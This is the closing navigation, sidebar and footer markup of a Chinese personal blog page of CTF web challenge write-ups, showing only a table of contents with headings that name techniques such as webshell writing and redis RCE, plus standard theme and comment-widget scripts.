class="nav-number">52.</span> <span class="nav-text">[2020 新春红包题]1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XNUCA2019Qualifier-EasyPHP"><span class="nav-number">53.</span> <span class="nav-text">[XNUCA2019Qualifier]EasyPHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#b01lers2020-Life-on-Mars"><span class="nav-number">54.</span> <span class="nav-text">[b01lers2020]Life on Mars</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NPUCTF2020-ezlogin"><span class="nav-number">55.</span> <span class="nav-text">[NPUCTF2020]ezlogin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4-Laravel1"><span class="nav-number">56.</span> <span class="nav-text">[CISCN2019 总决赛 Day1 Web4]Laravel1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2018-annonymous"><span class="nav-number">57.</span> <span class="nav-text">[SUCTF 2018]annonymous</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2018-MultiSQL"><span class="nav-number">58.</span> <span class="nav-text">[SUCTF 2018]MultiSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#N1CTF-2018-eating-cms"><span class="nav-number">59.</span> <span class="nav-text">[N1CTF 2018]eating_cms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4"><span class="nav-number">60.</span> <span class="nav-text">[CISCN2019 华东南赛区]Web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-TimeTravel"><span class="nav-number">61.</span> <span class="nav-text">[V&amp;N2020 公开赛]TimeTravel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-Easy-Notes"><span class="nav-number">62.</span> <span class="nav-text">[HarekazeCTF2019]Easy Notes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPU2019-Web3"><span class="nav-number">63.</span> <span class="nav-text">[SWPU2019]Web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FireshellCTF2020-Caas"><span class="nav-number">64.</span> <span class="nav-text">[FireshellCTF2020]Caas</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NESTCTF-2019-Love-Math-2"><span class="nav-number">65.</span> <span class="nav-text">[NESTCTF 2019]Love Math 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RootersCTF2019-babyWeb"><span class="nav-number">66.</span> <span class="nav-text">[RootersCTF2019]babyWeb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RootersCTF2019-ImgXweb"><span class="nav-number">67.</span> <span class="nav-text">[RootersCTF2019]ImgXweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSAWQual-2016-i-got-id"><span class="nav-number">68.</span> <span class="nav-text">[CSAWQual 2016]i_got_id</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BSidesCF-2020-Cards"><span class="nav-number">69.</span> <span class="nav-text">[BSidesCF 2020]Cards</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FireshellCTF2020-URL-TO-PDF"><span class="nav-number">70.</span> <span class="nav-text">[FireshellCTF2020]URL TO PDF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Node-Game"><span class="nav-number">71.</span> <span class="nav-text">[GYCTF2020]Node Game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HITCON-2016-Leaking"><span class="nav-number">72.</span> <span class="nav-text">[HITCON 2016]Leaking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FireshellCTF2020-ScreenShooter"><span class="nav-number">73.</span> <span class="nav-text">[FireshellCTF2020]ScreenShooter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FBCTF2019-Event"><span class="nav-number">74.</span> <span class="nav-text">[FBCTF2019]Event</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PASECA2019-honey-shop"><span class="nav-number">75.</span> <span class="nav-text">[PASECA2019]honey_shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp"><span class="nav-number">76.</span> <span class="nav-text">[极客大挑战 2020]Greatphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp1-Welcome"><span class="nav-number">77.</span> <span class="nav-text">[极客大挑战 2020]Roamphp1-Welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PwnThyBytes-2019-Baby-SQL"><span class="nav-number">78.</span> <span class="nav-text">[PwnThyBytes 2019]Baby_SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Online-Proxy-1"><span class="nav-number">79.</span> <span class="nav-text">[RoarCTF 2019]Online Proxy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#watevrCTF-2019-Pickle-Store"><span class="nav-number">80.</span> <span class="nav-text">[watevrCTF-2019]Pickle Store</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97"><span class="nav-number">81.</span> <span class="nav-text">[GWCTF 2019]你的名字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF-2019-Nextphp"><span class="nav-number">82.</span> <span class="nav-text">[RCTF 2019]Nextphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#watevrCTF-2019-Supercalc"><span class="nav-number">83.</span> <span class="nav-text">[watevrCTF-2019]Supercalc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web2"><span class="nav-number">84.</span> <span class="nav-text">[Black Watch 入群题]Web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pasecactf-2019-flask-ssti"><span class="nav-number">85.</span> <span class="nav-text">[pasecactf_2019]flask_ssti</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E"><span class="nav-number">86.</span> <span class="nav-text">[NPUCTF2020]验证🐎</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hash%E7%BB%95%E8%BF%87"><span class="nav-number">86.1.</span> <span class="nav-text">hash绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="nav-number">86.2.</span> <span class="nav-text">构造函数执行任意代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zer0pts2020-musicblog"><span class="nav-number">87.</span> <span class="nav-text">[Zer0pts2020]musicblog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WUSTCTF2020-Train-Yourself-To-Be-Godly"><span class="nav-number">88.</span> <span class="nav-text">[WUSTCTF2020]Train Yourself To Be Godly</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phuck2"><span class="nav-number">89.</span> <span class="nav-text">Phuck2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp"><span class="nav-number">90.</span> <span class="nav-text">[羊城杯2020]easyphp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%E3%80%81%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%88%B0index-php"><span class="nav-number">90.1.</span> <span class="nav-text">方法一、写入一句话木马到index.php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E3%80%81%E5%86%99%E5%85%A5%E4%B8%80%E4%B8%AA-user-ini%E8%AE%A9index-php%E8%87%AA%E5%8A%A8%E5%8C%85%E5%90%AB%E4%B8%8A%E6%88%91%E4%BB%AC%E5%86%99%E5%85%A5%E7%9A%84%E9%A9%AC"><span class="nav-number">90.2.</span> <span class="nav-text">方法二、写入一个.user.ini让index.php自动包含上我们写入的马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-number">90.3.</span> <span class="nav-text">方法三</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B-%EF%BC%9A%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%EF%BC%8C%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%86%99%E5%85%A5WebShell"><span class="nav-number">90.4.</span> <span class="nav-text">方法四 ：回溯绕过，利用php伪协议 写入WebShell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web3-Flask-Message-Board"><span class="nav-number">91.</span> <span class="nav-text">[CISCN2019 总决赛 Day1 Web3]Flask Message Board</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#October-2019-Twice-SQL-Injection"><span class="nav-number">92.</span> <span class="nav-text">October 2019 Twice SQL Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat"><span class="nav-number">93.</span> <span class="nav-text">[羊城杯 2020]Blackcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-EasySer"><span class="nav-number">94.</span> <span class="nav-text">[羊城杯 2020]EasySer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe"><span class="nav-number">95.</span> <span class="nav-text">[网鼎杯 2020 玄武组]SSRFMe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce"><span class="nav-number">95.1.</span> <span class="nav-text">redis主从复制rce</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite"><span class="nav-number">96.</span> <span class="nav-text">[网鼎杯 2020 半决赛]AliceWebsite</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#De1CTF-2019-Giftbox"><span class="nav-number">97.</span> <span class="nav-text">[De1CTF 2019]Giftbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-Sqlite-Voting"><span class="nav-number">98.</span> <span class="nav-text">[HarekazeCTF2019]Sqlite Voting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MRCTF2020-Ezpop-Revenge"><span class="nav-number">99.</span> <span class="nav-text">[MRCTF2020]Ezpop_Revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BSidesCF-2019-Sequel"><span class="nav-number">100.</span> <span class="nav-text">[BSidesCF 2019]Sequel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zer0pts2020-phpNantokaAdmin"><span class="nav-number">101.</span> <span class="nav-text">[Zer0pts2020]phpNantokaAdmin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-Hideandseek"><span class="nav-number">102.</span> <span class="nav-text">[HCTF 2018]Hideandseek</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VNCTF-2021-realezjvav"><span class="nav-number">103.</span> <span class="nav-text">[VNCTF 2021]realezjvav</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FBCTF2019-Products-Manager"><span class="nav-number">104.</span> <span class="nav-text">[FBCTF2019]Products Manager</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%AF%94%E8%BE%83"><span class="nav-number">104.1.</span> <span class="nav-text">数据库字符串比较</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#INSERT%E6%88%AA%E6%96%AD"><span class="nav-number">104.2.</span> <span class="nav-text">INSERT截断</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD"><span class="nav-number">105.</span> <span class="nav-text">梦里花开牡丹亭</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java"><span class="nav-number">106.</span> <span class="nav-text">[网鼎杯 2020 朱雀组]Think Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PyCalX-1-amp-2"><span class="nav-number">107.</span> <span class="nav-text">PyCalX 1&amp;2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMCTF2020-Make-PHP-Great-Again-2-0"><span class="nav-number">108.</span> <span class="nav-text">[WMCTF2020]Make PHP Great Again 2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMCTF2020-Web-Check-in-2-0"><span class="nav-number">109.</span> <span class="nav-text">[WMCTF2020]Web Check in 2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#suctf2019-Upload-Labs-2"><span class="nav-number">110.</span> <span class="nav-text">suctf2019-Upload-Labs-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2016-Web7"><span class="nav-number">111.</span> <span class="nav-text">[SWPUCTF 2016]Web7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-HITCON-2019-Buggy-Net"><span class="nav-number">112.</span> <span class="nav-text">[Windows][HITCON 2019]Buggy_Net</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2"><span class="nav-number">113.</span> <span class="nav-text">[羊城杯 2020]Easyphp2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-LFI2019"><span class="nav-number">114.</span> <span class="nav-text">[Windows]LFI2019</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="安小琪"
      src="/images/header.jpg">
  <p class="site-author-name" itemprop="name">安小琪</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">104</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">22</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
        </li>
    </ul>
  </div>

      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>


<!--
 <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
-->


  <span class="author" itemprop="copyrightHolder">安小琪</span>
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
  </div>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  




  
<script src="/js/local-search.js"></script>









<script>
document.querySelectorAll('.pdfobject-container').forEach(element => {
  let url = element.dataset.target;
  let pdfOpenParams = {
    navpanes : 0,
    toolbar  : 0,
    statusbar: 0,
    pagemode : 'thumbs',
    view     : 'FitH'
  };
  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;

  if (NexT.utils.supportsPDFs()) {
    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
  } else {
    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
  }
});
</script>




  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
      avatar     : '',
      meta       : guest,
      pageSize   : '6' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
